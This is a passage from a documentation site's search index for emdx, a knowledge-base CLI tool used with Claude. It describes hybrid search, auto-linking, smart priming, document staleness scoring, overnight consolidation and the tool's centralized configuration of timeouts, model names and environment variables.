hybrid_search(get_doc(doc_id).content, limit=5)\n\n    # Create bidirectional links\n    for match in similar:\n        if match.score &gt; 0.5:\n            create_link(doc_id, match.id, score=match.score)\n            create_link(match.id, doc_id, score=match.score)\n</code></pre> <p>Prevents over-connection: Max 5 links per document, minimum 50% similarity.</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#contextual-save-service","title":"Contextual Save Service","text":"<p>Prevents duplicate research through pre-save similarity checks:</p> <pre><code># emdx/services/contextual_save.py\n@dataclass\nclass CheckResult:\n    similar_docs: List[SimilarDoc]  # Top N matches\n    recommendation: str              # \"Update #6085\" or \"Save as new\"\n    suggested_tags: List[str]        # From neighbor tags\n    suggested_project: str | None    # Inferred from content\n\ndef check_before_save(title: str, content: str) -&gt; CheckResult:\n    similar = hybrid_search(f\"{title} {content}\", limit=10)\n    duplicates = [d for d in similar if d.score &gt; 0.8]\n\n    if duplicates:\n        return CheckResult(\n            similar_docs=duplicates,\n            recommendation=f\"Duplicate of #{duplicates[0].id}. Update instead?\",\n            suggested_tags=extract_common_tags(duplicates[:3]),\n            suggested_project=infer_project(content)\n        )\n</code></pre> <p>CLI Usage:</p> <pre><code>$ emdx save --suggest &lt;&lt;EOF\nResearch findings on OAuth2 security patterns...\nEOF\n\n# Output:\n# \u2713 Saved #6095 \"OAuth2 Security Notes\"\n# \u26a0 Similar docs found:\n#   #6086 (73% similar) \u2014 consider `emdx edit 6086` to update instead\n# Suggested tags: security, authentication\n# Project: auth-service\n</code></pre> <p>Key Design: Always save, just warn. Claude decides whether to delete and edit existing doc instead.</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#smart-priming-service","title":"Smart Priming Service","text":"<p>Context-aware session initialization using clustering and recency:</p> <pre><code># emdx/services/priming_service.py\nclass PrimingService:\n    def get_context(self, lookback_days=7, n_clusters=5, max_docs=10):\n        # 1. Get recently accessed docs\n        recent = get_recent_docs(lookback_days)\n\n        # 2. Cluster by topic using MiniBatchKMeans\n        embeddings = [doc.embedding for doc in recent]\n        clusters = kmeans(embeddings, n_clusters=n_clusters)\n\n        # 3. Rank tasks by cluster coherence\n        tasks = get_ready_tasks()\n        for task in tasks:\n            task.cluster_id = assign_cluster(task.embedding, clusters)\n\n        # 4. Return grouped context\n        return PrimingContext(\n            tasks_by_cluster=group_by(tasks, 'cluster_id'),\n            recent_docs=recent[:max_docs],\n            knowledge_map=build_tag_coverage(recent)\n        )\n</code></pre> <p>Database Migration (#034):</p> <pre><code>ALTER TABLE documents ADD COLUMN accessed_at TIMESTAMP;\nCREATE INDEX idx_accessed_at ON documents(accessed_at);\n</code></pre> <p>CLI Output (token-efficient):</p> <pre><code>$ emdx prime --smart\n\nEMDX CONTEXT \u2014 Project: auth-service\nRecent: #6094 \"OAuth2 Flow\" (yesterday), #6086 \"Security Checklist\" (most referenced)\nKey docs: #6086 (8 views, 4 links), #6088 (5 views, 3 links)\nKnowledge map: \u2713 architecture, security | \u2717 testing, deployment\nNeeds review: #6085 (5 days stale, HIGH importance)\n\nREADY TASKS (grouped by topic):\n  Cluster 1 (Auth):\n    TUI-10: Wire QA presenter into QA screen\n    FEAT-17: Add keybindings to unified dashboard\n</code></pre> <p>Configuration (in <code>config/constants.py</code>):</p> <pre><code>PRIMING_CLUSTER_COUNT = 5\nPRIMING_LOOKBACK_DAYS = 7\nPRIMING_MAX_RECENT_DOCS = 10\n</code></pre>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#knowledge-decay-detection","title":"Knowledge Decay Detection","text":"<p>Surfaces forgotten but important documents:</p> <pre><code># emdx/services/decay_service.py\ndef compute_staleness(doc: Document) -&gt; float:\n    days_since_access = (now() - doc.accessed_at).days\n    age_weight = 0.4 * (days_since_access / 365)\n\n    link_count = count_incoming_links(doc.id)\n    link_weight = 0.3 * (1 - link_count / max_links_seen)\n\n    recent_activity = count_related_activity(doc.id, days=30)\n    activity_weight = 0.3 * (1 - recent_activity / max_activity_seen)\n\n    return min(1.0, age_weight + link_weight + activity_weight)\n</code></pre> <p>Database Migration (#034):</p> <pre><code>ALTER TABLE documents ADD COLUMN stale_score REAL DEFAULT 0.0;\nALTER TABLE documents ADD COLUMN last_reviewed_at TIMESTAMP;\n</code></pre> <p>CLI Usage:</p> <pre><code>$ emdx stale list --threshold 0.7\n# Stale Documents (importance &gt; 0.7):\n#   #6085 \"Auth Architecture\" \u2014 45 days since review, 8 incoming links\n#   #5998 \"OAuth Bug Analysis\" \u2014 60 days, 3 links\n\n$ emdx stale review 6085\n# Resets last_reviewed_at, recalculates staleness\n</code></pre> <p>Importance Formula: <code>view_count + (inbound_links \u00d7 2)</code> \u2014 favors well-connected documents.</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#dream-journal-overnight-consolidation","title":"Dream Journal: Overnight Consolidation","text":"<p>Core Functions: 1. Duplicate detection &amp; merging (&gt;80% similarity) 2. Tag normalization (\"auth\", \"authentication\" \u2192 \"authentication\") 3. Automatic relationship discovery via clustering 4. Staleness detection and flagging 5. Summary generation from document clusters</p> <p>Planned Implementation:</p> <pre><code># Cron job (runs at 2am)\n0 2 * * * emdx maintain consolidate --auto\n</code></pre> <p>Consolidation Pipeline:</p> <pre><code># emdx/commands/maintain.py\ndef run_consolidation():\n    # 1. Find duplicate clusters\n    duplicates = find_similar_clusters(threshold=0.8)\n\n    # 2. Merge each cluster\n    for cluster in duplicates:\n        merged = merge_documents(cluster, strategy=\"full_merge\")\n        archive_sources(cluster.doc_ids)\n        create_consolidation_record(cluster.doc_ids, merged.id)\n\n    # 3. Normalize tags\n    tag_mapping = detect_tag_variants()\n    standardize_tags(tag_mapping)\n\n    # 4. Rebuild indexes\n    rebuild_embeddings()\n    rebuild_links()\n</code></pre> <p>Database Schema:</p> <pre><code>CREATE TABLE consolidation_history (\n    id INTEGER PRIMARY KEY,\n    source_doc_ids TEXT,          -- JSON array of merged doc IDs\n    result_doc_id INTEGER,\n    similarity_score REAL,\n    merge_strategy TEXT,          -- \"full_merge\", \"summary\", \"link_only\"\n    created_at TIMESTAMP\n);\n</code></pre> <p>Merge Strategies: - <code>full_merge</code>: Combine content, preserve all details - <code>summary</code>: LLM-generated overview linking to sources - <code>link_only</code>: Keep separate, add \"superseded by\" links</p> <p>Safety: Never auto-delete. Sources archived (soft delete) with full provenance tracking.</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#migration-timeline","title":"Migration Timeline","text":"<p>The Sprint PRs introduced four new migrations:</p> <ul> <li>Migration #034 (PR #451): <code>stale_score</code>, <code>last_reviewed_at</code> for knowledge decay</li> <li>Migration #036 (main): Execution metrics and task linkage</li> <li>Migration #037 (main): ON DELETE CASCADE foreign keys</li> <li>Migration #038 (main): Case-insensitive search indexes</li> <li>Migration #039 (main): Task categories</li> <li>Migration #040 (PR #614): Chunk embeddings for semantic search</li> </ul> <p>Conflict Resolution: Feature branches numbered migrations sequentially, requiring renumbering during rebase (36\u219239\u219240).</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#test-coverage","title":"Test Coverage","text":"<p>Two comprehensive test suites added in PR #614:</p> <p><code>tests/test_chunk_splitter.py</code> (16 tests): - Heading boundary detection - Token limit enforcement (configurable MAX_CHUNK_TOKENS) - Empty document handling - Nested heading preservation - Edge cases: no headings, very long headings</p> <p><code>tests/test_hybrid_search.py</code> (27 tests): - BM25 score normalization - Cosine similarity normalization - Hybrid score merging with alpha weights - Search mode detection - Empty result handling - Score ordering guarantees</p> <p>Final Status: 1153 tests pass (1 pre-existing failure in <code>test_similarity.py</code> unrelated to sprint).</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#critical-bug-fixes","title":"Critical Bug Fixes","text":"<p>PR #454 Test Failures: Hybrid search became default mode, breaking 4 tests that mocked <code>search_documents()</code> for FTS5. Fix: add <code>--mode keyword</code> to force old path in tests.</p> <p>PR #446 ANSI Codes: CLI help output contained escape codes (<code>\\x1b[1;36m--smart\\x1b[0m</code>), breaking string assertions. Fix: <code>re.sub(r\"\\x1b\\[[0-9;]*m\", \"\", output)</code> before comparison.</p> <p>Type Annotations: Legacy <code>Optional[str]</code> \u2192 modern <code>str | None</code> during rebase.</p> <p>Ruff Violations: - Line length: Multi-line SQL queries (100-char limit) - B905: Added <code>strict=True</code> to <code>zip()</code> calls - Unused imports: Removed <code>Progress</code> from auto-linking</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#configuration-parameters","title":"Configuration Parameters","text":"<p>All configurable via <code>emdx/config/constants.py</code>:</p> Feature Parameter Default Smart Priming Cluster count 5 Smart Priming Lookback window 7 days Smart Priming Max recent docs 10 Auto-Linking Min similarity 50% Auto-Linking Max links/doc 5 Dream Journal Retention days 30 Knowledge Decay Age weight 0.4 Knowledge Decay Link weight 0.3 Knowledge Decay Activity weight 0.3 Hybrid Search Keyword weight 0.4 Hybrid Search Semantic weight 0.6 Hybrid Search Hybrid boost 0.15 Chunk Splitter Min tokens 100 Chunk Splitter Max tokens 500"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#lazy-loading-pattern","title":"Lazy Loading Pattern","text":"<p>Heavy dependencies (sentence-transformers, scikit-learn) use TYPE_CHECKING guards to avoid startup penalties:</p> <pre><code>from __future__ import annotations\nfrom typing import TYPE_CHECKING\n\nif TYPE_CHECKING:\n    from emdx.services.embedding_service import EmbeddingService\n\nclass HybridSearchService:\n    def __init__(self):\n        self._embedding: EmbeddingService | None = None\n\n    def _get_embedding(self) -&gt; EmbeddingService:\n        if self._embedding is None:\n            from emdx.services.embedding_service import EmbeddingService\n            self._embedding = EmbeddingService(self.db_path)\n        return self._embedding\n</code></pre> <p>Rationale: Avoid importing torch/transformers for simple CLI commands like <code>emdx view</code>.</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#graceful-degradation","title":"Graceful Degradation","text":"<p>Features degrade when dependencies unavailable: - No sklearn \u2192 No clustering in Smart Priming (falls back to recency-only) - No embeddings \u2192 Hybrid search becomes keyword-only - No gh CLI \u2192 Manual linking instead of auto-linking PRs</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#the-master-gameplan-daily-workflow","title":"The Master Gameplan: Daily Workflow","text":""},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#morning-session-start","title":"Morning (Session Start)","text":"<pre><code>$ emdx prime --smart\n\n# Claude receives:\n# - Ready tasks grouped by semantic clusters\n# - Recent docs from current project\n# - Knowledge map showing coverage gaps\n# - Stale important docs needing review\n</code></pre> <p>Session starts with full situational awareness: prior art, recent context, knowledge gaps.</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#during-work","title":"During Work","text":"<pre><code># Contextual Save prevents duplicates\n$ echo \"OAuth2 implementation notes...\" | emdx save --title \"Auth Notes\" --suggest\n\n# Output:\n# \u2713 Saved #6100 \"Auth Notes\"\n# \u26a0 Similar to #6085 (82% overlap) \u2014 consider updating instead\n# Suggested tags: authentication, security\n# \ud83d\udd17 Auto-linked to:\n#   #6085 \"Auth Architecture\" (82% similar)\n#   #6045 \"API Security\" (67% similar)\n\n# Claude can choose to update existing doc\n$ emdx edit 6085\n</code></pre> <p>KB grows in depth (updated docs) not just breadth (new docs).</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#evening-after-work","title":"Evening (After Work)","text":"<pre><code>$ emdx status --stats --detailed\n\n# Output:\n# Knowledge Base Statistics:\n#   Total docs: 1247 (+12 today)\n#   Duplicate clusters: 3 (&gt;80% similarity)\n#   Stale docs needing review: 8\n#   Auto-links created: 47 today\n</code></pre>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#overnight-dream-journal","title":"Overnight (Dream Journal)","text":"<pre><code># Cron job at 2am\n$ emdx maintain consolidate --auto\n\n# Operations:\n# 1. Merge 3 duplicate clusters \u2192 3 consolidated docs\n# 2. Normalize tags: \"auth\", \"authentication\" \u2192 \"authentication\"\n# 3. Rebuild embedding index\n# 4. Backfill missing links (new docs \u2192 existing related docs)\n# 5. Update staleness scores\n</code></pre> <p>Next morning, KB is consolidated and connections are refreshed.</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#integration-points","title":"Integration Points","text":"<p>The six features form a cohesive system:</p> <ol> <li>Dream Journal captures raw ideas \u2192 Contextual Save suggests tags/links when archiving \u2192 Auto-Linking discovers relationships</li> <li>Smart Priming surfaces recent context \u2192 Hybrid Search retrieves relevant chunks \u2192 Ask KB generates RAG answers</li> <li>Knowledge Decay identifies stale docs \u2192 Auto-Linking shows if still referenced \u2192 Dream Journal flags for consolidation</li> </ol> <p>This creates a virtuous cycle where the KB becomes more organized and useful over time with minimal manual curation.</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#success-metrics","title":"Success Metrics","text":"<p>Knowledge Quality: - KB depth increases (more edits to existing docs) - KB breadth stabilizes (fewer new docs per session) - Duplicate rate &lt;5% (down from 60-80%)</p> <p>Claude Efficiency: - Context tokens saved via chunk retrieval - Faster task completion (prior art awareness) - Fewer \"I already researched this\" moments</p> <p>System Health: - Consolidation operations complete &lt;5min - Hybrid search response time &lt;100ms - Embedding index scales linearly with doc count</p>"},{"location":"articles/dream-journal-smart-priming-and-master-gameplan/#related-topics","title":"Related Topics","text":"<ul> <li>MCP Server Integration (PATH 5): Replace CLI output parsing with structured JSON tool calls via Model Context Protocol</li> <li>Proze Diff (PATH 1): Embedded prose comparison tool for tracking document evolution</li> <li>Conversation Archaeology (PATH 9): Extract key decisions from Claude sessions into emdx automatically</li> <li>Adversarial Review (PATH 10): AI-driven contradiction detection and quality scoring</li> </ul> <p>The Dream Journal/Smart Priming/Master Gameplan form the core intelligence layer. Future features build on this foundation to make the KB fully autonomous.</p> <p>Generated from 23 source documents</p>"},{"location":"articles/emdx-configuration-architecture/","title":"emdx Configuration Architecture","text":""},{"location":"articles/emdx-configuration-architecture/#overview","title":"Overview","text":"<p>The emdx project uses a centralized configuration system located in <code>emdx/config/</code> that manages models, timeouts, environment variables, and CLI tool settings. This configuration layer was consolidated in February 2026 as part of a technical debt audit (DEBT-7) to eliminate scattered hardcoded values across the codebase.</p>"},{"location":"articles/emdx-configuration-architecture/#core-configuration-modules","title":"Core Configuration Modules","text":""},{"location":"articles/emdx-configuration-architecture/#emdxconfigconstantspy-central-constants","title":"<code>emdx/config/constants.py</code> \u2014 Central Constants","text":"<p>The single source of truth for all configurable values across the project.</p> <p>Timeout Constants:</p> Constant Value Purpose <code>DEFAULT_TIMEOUT_SECONDS</code> / <code>DEFAULT_CLI_TIMEOUT_SECONDS</code> / <code>CLI_SYNC_DEFAULT_TIMEOUT</code> 300s (5 min) Standard task timeout <code>DELEGATE_TIMEOUT_SECONDS</code> 600s (10 min) Delegate command execution <code>CASCADE_STAGE_TIMEOUT</code> / <code>CASCADE_TIMEOUT_SECONDS</code> / <code>STAGE_DEFAULT_TIMEOUT</code> 300s (5 min) Analysis/planning stages <code>CASCADE_IMPLEMENTATION_TIMEOUT</code> / <code>IMPLEMENTATION_TIMEOUT_SECONDS</code> / <code>STAGE_IMPLEMENTATION_TIMEOUT</code> 1800s (30 min) Code generation tasks <code>DISCOVERY_TIMEOUT_SECONDS</code> / <code>DISCOVERY_COMMAND_TIMEOUT</code> 30s Shell discovery commands (<code>--each</code>) <code>CLI_VERSION_CHECK_TIMEOUT</code> / <code>SUBPROCESS_SHORT_TIMEOUT_SECONDS</code> / <code>VERSION_CHECK_TIMEOUT_SECONDS</code> 5s Version/status checks <code>CLI_AUTH_CHECK_TIMEOUT</code> / <code>SUBPROCESS_MEDIUM_TIMEOUT_SECONDS</code> / <code>AUTH_CHECK_TIMEOUT_SECONDS</code> 10s Authentication verification <code>GITHUB_AUTH_TIMEOUT</code> 10s <code>gh auth token</code> retrieval <code>PROCESS_TERMINATE_TIMEOUT</code> 3s Graceful termination wait <code>PROCESS_KILL_TIMEOUT</code> 1s Force kill wait <code>STALE_EXECUTION_TIMEOUT_SECONDS</code> (implementation-defined) Stale execution detection <p>UI Debounce Constants:</p> Constant Value Purpose <code>DEBOUNCE_FTS_MS</code> 300ms Full-text search debounce <code>DEBOUNCE_TAGS_MS</code> 300ms Tag search debounce <code>DEBOUNCE_SEMANTIC_MS</code> 500ms Semantic search debounce <code>DEBOUNCE_COMBINED_MS</code> 400ms Combined search debounce <p>Health/Quality Constants:</p> <ul> <li><code>HEALTH_SCORE_GOOD_THRESHOLD = 80</code> \u2014 Score threshold for \"good\" quality</li> <li><code>HEALTH_SCORE_WARNING_THRESHOLD = 60</code> \u2014 Score threshold for warnings</li> </ul> <p>ML/Search Constants:</p> <ul> <li><code>MIN_EMBEDDINGS_FOR_SEMANTIC = 50</code> \u2014 Minimum embeddings required for semantic search</li> <li><code>DEFAULT_MAX_TOKENS = 1000</code> \u2014 Maximum tokens for LLM API calls</li> </ul> <p>Environment Variable Names:</p> <p>All environment variable names are exported as constants with <code>ENV_</code> prefix:</p> <ul> <li><code>ENV_CLI_TOOL = \"EMDX_CLI_TOOL\"</code> \u2014 CLI tool selection</li> <li><code>ENV_SAFE_MODE = \"EMDX_SAFE_MODE\"</code> \u2014 Safe mode toggle</li> <li><code>ENV_TEST_DB = \"EMDX_TEST_DB\"</code> \u2014 Test database path</li> <li><code>ENV_CODE_THEME = \"EMDX_CODE_THEME\"</code> \u2014 Code syntax theme</li> <li><code>ENV_ANTHROPIC_API_KEY</code> \u2014 Anthropic API key (sensitive)</li> <li><code>ENV_CURSOR_API_KEY</code> \u2014 (Legacy, removed in 2026-02)</li> <li><code>ENV_GITHUB_TOKEN</code> \u2014 GitHub token (sensitive)</li> <li><code>ENV_EMDX_DATABASE_URL</code> \u2014 Database connection URL</li> </ul> <p>Environment Variable Validation:</p> <ul> <li><code>BOOL_TRUTHY_VALUES</code> \u2014 Set of accepted boolean-like values for env var parsing</li> <li><code>ENV_VARS</code> \u2014 Dictionary documenting all known environment variables</li> </ul> <p>Miscellaneous:</p> <ul> <li><code>DEFAULT_EDITOR = \"nano\"</code> \u2014 Fallback editor if <code>EDITOR</code> not set</li> </ul>"},{"location":"articles/emdx-configuration-architecture/#emdxconfigmodelspy-model-name-registry","title":"<code>emdx/config/models.py</code> \u2014 Model Name Registry","text":"<p>Previously, model name strings were duplicated across 5+ files. Now centralized:</p> <pre><code>CLAUDE_MODEL_OPUS / CLAUDE_OPUS_MODEL = \"claude-opus-4-6\"\nCLAUDE_MODEL_SONNET / CLAUDE_SONNET_MODEL = \"claude-sonnet-4-5-20250929\"\nDEFAULT_CLAUDE_MODEL = CLAUDE_OPUS_MODEL  # Default for most operations\nDEFAULT_ASK_MODEL / DEFAULT_CLAUDE_FAST_MODEL = CLAUDE_SONNET_MODEL  # For Q&amp;A service\n</code></pre> <p>Removed (as of 2026-02): - <code>CURSOR_MODEL_OPUS</code> / <code>CURSOR_MODEL_SONNET</code> \u2014 Cursor IDE support removed - All <code>MODEL_ALIASES</code> entries for <code>\"cursor\"</code></p> <p>Helper: - <code>resolve_model()</code> \u2014 Resolves model aliases to canonical names</p>"},{"location":"articles/emdx-configuration-architecture/#emdxconfigcli_configpy-cli-tool-configuration","title":"<code>emdx/config/cli_config.py</code> \u2014 CLI Tool Configuration","text":"<p>Manages configuration for different CLI tools (currently Claude CLI only).</p> <p>Key Components:</p> <pre><code>@dataclass\nclass CliConfig:\n    \"\"\"Configuration for a specific CLI tool\"\"\"\n    tool: str                  # Tool identifier\n    binary_names: list[str]    # Possible binary names in PATH\n    default_model: str         # Default model for this tool\n    version_flag: str          # Flag to check version\n    json_flag: str             # Flag for JSON output\n    env_api_key: str           # Environment variable for API key\n</code></pre> <p>Enum:</p> <pre><code>class CliTool(str, Enum):\n    CLAUDE = \"claude\"\n    # CURSOR removed 2026-02\n</code></pre> <p>Registry:</p> <pre><code>CLI_CONFIGS = {\n    CliTool.CLAUDE: CliConfig(\n        tool=\"claude\",\n        binary_names=[\"claude\"],\n        default_model=CLAUDE_OPUS_MODEL,\n        version_flag=\"--version\",\n        json_flag=\"--stream-json\",\n        env_[REDACTED]\n    ),\n}\n</code></pre> <p>Model Aliases:</p> <p>Maps user-friendly names to canonical model strings:</p> <pre><code>MODEL_ALIASES = {\n    \"claude\": {\n        \"opus\": CLAUDE_MODEL_OPUS,\n        \"sonnet\": CLAUDE_MODEL_SONNET,\n        \"4.6\": CLAUDE_MODEL_OPUS,\n        \"4.5\": CLAUDE_MODEL_SONNET,\n    },\n}\n</code></pre> <p>Functions: - <code>get_default_cli_tool()</code> \u2014 Returns CLI tool from <code>EMDX_CLI_TOOL</code> or defaults to <code>\"claude\"</code> - <code>get_available_models()</code> \u2014 Lists available models for a given CLI tool</p>"},{"location":"articles/emdx-configuration-architecture/#emdxconfigsettingspy-environment-validation","title":"<code>emdx/config/settings.py</code> \u2014 Environment Validation","text":"<p>Provides validation and introspection for environment variables.</p> <p>Validation Functions:</p> <ul> <li><code>validate_env_var(name, value)</code> \u2014 Validate single environment variable</li> <li><code>validate_all_env_vars()</code> \u2014 Validate all EMDX environment variables</li> <li><code>validate_environment()</code> \u2014 Check for required environment variables (raises on missing)</li> <li><code>validate_api_key(raise_on_missing=False)</code> \u2014 Validate <code>ANTHROPIC_API_KEY</code> specifically</li> <li><code>validate_database_url()</code> \u2014 Validate <code>EMDX_DATABASE_URL</code> if set</li> <li><code>get_env_var(name, validate=True)</code> \u2014 Get environment variable with optional validation</li> <li><code>get_env_info()</code> \u2014 Get information about all EMDX environment variables (masks sensitive values)</li> <li><code>get_required_env_vars()</code> \u2014 Returns list of recommended environment variables</li> <li><code>get_optional_env_vars()</code> \u2014 Returns list of optional environment variables</li> </ul> <p>Exception:</p> <pre><code>class EnvValidationError(Exception):\n    \"\"\"Raised when required environment variables are missing\"\"\"\n</code></pre> <p>Metadata:</p> <pre><code>ENV_VAR_DEFINITIONS = {\n    \"EMDX_CLI_TOOL\": {\n        \"description\": \"CLI tool selection\",\n        \"required\": False,\n        \"sensitive\": False,\n    },\n    \"ANTHROPIC_API_KEY\": {\n        \"description\": \"Anthropic API key\",\n        \"required\": True,\n        \"sensitive\": True,\n    },\n    # ...\n}\n</code></pre>"},{"location":"articles/emdx-configuration-architecture/#emdxconfigui_configpy-user-interface-preferences","title":"<code>emdx/config/ui_config.py</code> \u2014 User Interface Preferences","text":"<p>Manages persistent user preferences for the TUI.</p> <p>Key Features: - Theme selection (default: <code>\"emdx-dark\"</code>) - User preference persistence to <code>~/.config/emdx/</code> - Rendered markdown vs plain text toggle - Fuzzy search settings</p>"},{"location":"articles/emdx-configuration-architecture/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/emdx-configuration-architecture/#centralization-rationale-debt-7-audit-2026-02-14","title":"Centralization Rationale (DEBT-7 Audit, 2026-02-14)","text":"<p>Problem: Configuration debt was identified across 13+ files: - Model names hardcoded in 5 files - Timeout values scattered across 10+ files - Environment variables read without validation - No central documentation of configurable values</p> <p>Solution: Three-phase centralization:</p> <ol> <li>Immediate (PR #511, #526):</li> <li>Created <code>config/models.py</code> as single source of truth for model names</li> <li>Moved all timeout values to <code>config/constants.py</code> with <code>TIMEOUT_*</code> prefix</li> <li> <p>Added <code>ENV_VAR_DEFINITIONS</code> dictionary with metadata</p> </li> <li> <p>Short-term:</p> </li> <li>Added environment variable validation helpers in <code>config/settings.py</code></li> <li>Defined exit code constants (<code>EXIT_TIMEOUT = 124</code>, etc.)</li> <li> <p>Created <code>config/ui_layout.py</code> for UI dimension constants (planned)</p> </li> <li> <p>Long-term:</p> </li> <li>YAML config file support for user-adjustable settings (planned)</li> <li><code>emdx config</code> command for runtime configuration (planned)</li> <li>Support reading defaults from <code>~/.config/emdx/defaults.yaml</code> (planned)</li> </ol> <p>Benefits Achieved: - Single source of truth for all configuration values - Easier maintenance (change one constant, update entire codebase) - Better IDE support (autocomplete, refactoring) - Environment validation catches invalid configuration early - Reduced duplication (model strings defined once, used everywhere)</p>"},{"location":"articles/emdx-configuration-architecture/#timeout-strategy","title":"Timeout Strategy","text":"<p>The codebase uses task-based timeouts rather than global defaults:</p> <ul> <li>Standard tasks (5 min): Searching, analyzing, reading files</li> <li>Code generation tasks (30 min): Writing code, refactoring, synthesis</li> <li>Delegate tasks (10 min): Parallel research, investigations</li> <li>Subprocess checks (5-10s): Version checks, auth validation</li> </ul> <p>Timeouts are configurable via constants rather than CLI flags, allowing users to adjust globally for slow networks or large operations.</p>"},{"location":"articles/emdx-configuration-architecture/#model-selection-hierarchy","title":"Model Selection Hierarchy","text":"<p>Model resolution follows this precedence:</p> <ol> <li>Explicit parameter (<code>--model opus</code>)</li> <li>CLI tool default (from <code>CLI_CONFIGS[tool].default_model</code>)</li> <li>Global default (<code>DEFAULT_CLAUDE_MODEL</code>)</li> </ol> <p>The <code>resolve_model()</code> helper handles alias expansion (<code>\"opus\"</code> \u2192 <code>\"claude-opus-4-6\"</code>).</p>"},{"location":"articles/emdx-configuration-architecture/#environment-variable-patterns","title":"Environment Variable Patterns","text":"<p>Boolean Variables:</p> <pre><code># Correct pattern (uses BOOL_TRUTHY_VALUES)\nsafe_mode = os.environ.get(\"EMDX_SAFE_MODE\", \"0\").lower() in BOOL_TRUTHY_VALUES\n</code></pre> <p>API Keys (Sensitive):</p> <pre><code># Use constant + validation\n[REDACTED] validate=True)\n</code></pre> <p>Optional with Fallback:</p> <pre><code># Use centralized getter with default\ncli_tool = get_default_cli_tool()  # Checks ENV_CLI_TOOL or defaults to \"claude\"\n</code></pre>"},{"location":"articles/emdx-configuration-architecture/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/emdx-configuration-architecture/#files-updated-during-centralization-13-files","title":"Files Updated During Centralization (13+ files)","text":"<p>Core Commands: - <code>emdx/commands/cascade.py</code> \u2014 Uses <code>CASCADE_*_TIMEOUT</code> - <code>emdx/commands/delegate.py</code> \u2014 Uses <code>DELEGATE_TIMEOUT_SECONDS</code>, <code>DISCOVERY_TIMEOUT_SECONDS</code> - <code>emdx/commands/gist.py</code> \u2014 Uses <code>GITHUB_AUTH_TIMEOUT</code> - <code>emdx/commands/maintain.py</code> \u2014 Uses <code>PROCESS_*_TIMEOUT</code> - <code>emdx/commands/core.py</code> \u2014 Uses <code>DEFAULT_EDITOR</code></p> <p>Service Layer: - <code>emdx/services/ask_service.py</code> \u2014 Uses <code>DEFAULT_ASK_MODEL</code>, <code>MIN_EMBEDDINGS_FOR_SEMANTIC</code> - <code>emdx/services/cascade_service.py</code> \u2014 Uses <code>CASCADE_*_TIMEOUT_SECONDS</code> - <code>emdx/services/claude_executor.py</code> \u2014 Uses <code>DEFAULT_CLI_TIMEOUT_SECONDS</code> - <code>emdx/services/unified_executor.py</code> \u2014 Uses <code>DEFAULT_TIMEOUT_SECONDS</code>, <code>CLI_SYNC_DEFAULT_TIMEOUT</code> - <code>emdx/services/execution_monitor.py</code> \u2014 Uses <code>STALE_EXECUTION_TIMEOUT_SECONDS</code> - <code>emdx/services/cli_executor/claude.py</code> \u2014 Uses <code>CLI_VERSION_CHECK_TIMEOUT</code> - <code>emdx/services/cli_executor/factory.py</code> \u2014 Uses <code>ENV_CLI_TOOL</code></p> <p>Configuration and Utilities: - <code>emdx/config/__init__.py</code> \u2014 Exports all constants - <code>emdx/config/constants.py</code> \u2014 Central definition file (+118 lines added) - <code>emdx/utils/environment.py</code> \u2014 Uses <code>ENV_*</code> and timeout constants - <code>emdx/models/executions.py</code> \u2014 Uses <code>STALE_EXECUTION_TIMEOUT_SECONDS</code> - <code>emdx/main.py</code> \u2014 Uses <code>BOOL_TRUTHY_VALUES</code>, <code>ENV_SAFE_MODE</code></p> <p>UI Layer: - <code>emdx/ui/markdown_config.py</code> \u2014 Uses <code>ENV_CODE_THEME</code> - <code>emdx/ui/search/search_presenter.py</code> \u2014 Uses <code>DEBOUNCE_*_MS</code> constants</p>"},{"location":"articles/emdx-configuration-architecture/#cursor-ide-support-removal-2026-02","title":"Cursor IDE Support Removal (2026-02)","text":"<p>The Cursor IDE CLI tool was removed from the codebase:</p> <p>Deleted: - <code>emdx/services/cli_executor/cursor.py</code> (272 lines) - <code>CliTool.CURSOR</code> enum value - All <code>CURSOR_MODEL_*</code> constants - <code>_check_cursor_config()</code> method in <code>environment.py</code></p> <p>Updated: - All module docstrings changed from \"supports Claude and Cursor\" \u2192 \"supports CLI tools\" - Removed <code>\"cursor\"</code> entries from <code>MODEL_ALIASES</code> - Removed <code>CURSOR</code> from <code>CLI_CONFIGS</code> registry</p> <p>Preserved: - SQLite <code>cursor</code> objects (<code>sqlite3.Cursor</code>, <code>conn.cursor()</code>) - TUI cursor navigation (<code>cursor_down</code>, <code>cursor_up</code>, <code>cursor_pos</code>) - CHANGELOG.md historical entries about Cursor support</p>"},{"location":"articles/emdx-configuration-architecture/#type-annotations-for-configuration","title":"Type Annotations for Configuration","text":"<p>Configuration dataclasses use optional types judiciously:</p> <p>Good Pattern (Legitimate Optionals):</p> <pre><code>@dataclass\nclass ExecutionConfig:\n    doc_id: int | None = None        # Document may not exist\n    model: str | None = None          # Falls back to default\n    timeout: int | None = None        # Uses CLI default if None\n</code></pre> <p>Avoid (Unnecessary Optionals):</p> <pre><code># Don't do this if the value is always set\nexit_code: int | None = None  # Should be `int = 0` if always assigned\n</code></pre> <p>See Document #6492 (None Type Analysis) for detailed analysis of <code>| None</code> annotations in executor files.</p>"},{"location":"articles/emdx-configuration-architecture/#related-topics","title":"Related Topics","text":"<ul> <li>CLI Execution Layer: <code>emdx/services/cli_executor/</code> \u2014 Abstract executor pattern</li> <li>Unified Executor: <code>emdx/services/unified_executor.py</code> \u2014 Main execution 